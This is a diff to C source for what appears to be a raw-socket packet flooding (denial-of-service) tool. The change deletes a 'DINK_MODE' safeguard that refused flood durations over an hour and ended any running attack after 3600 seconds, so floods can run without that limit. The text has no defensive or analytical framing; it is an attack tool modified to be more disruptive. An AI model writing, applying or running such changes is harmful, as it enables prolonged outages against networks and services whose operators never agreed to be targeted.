@@ -56,8 +56,6 @@ By darkness@efnet, greetz vae@efnet
 #define WSCALE
 #define STRINGLEN 64
 
-#define DINK_MODE
-
 int rawsock = 0;
 unsigned int start;
 unsigned long long int packets = 0;
@@ -442,14 +440,6 @@ void attack (unsigned int dest, unsigned short dstport, unsigned short flags, un
             pktsent = 0;
         }
 
-        #ifdef DINK_MODE
-        if (time (NULL) - start > 3600)
-        {
-            printf("-> Dink detected.\n");
-            handle_exit();
-        }
-        #endif
-
         if (time (NULL) - start >= ttime)
         {
             handle_exit();
@@ -504,15 +494,6 @@ int main (int argc, char **argv)
     pktcount = atoi(argv[6]);
     ttime = atoi(argv[7]);
     databytes = 0;
-
-
-    #ifdef DINK_MODE
-    if(ttime > 3600)
-    {
-        printf("-> Please rethink your time de(lusions)cisons.\n");
-        exit(-1);
-    }
-    #endif
 
     signal (SIGINT, handle_exit);
     signal (SIGTERM, handle_exit);
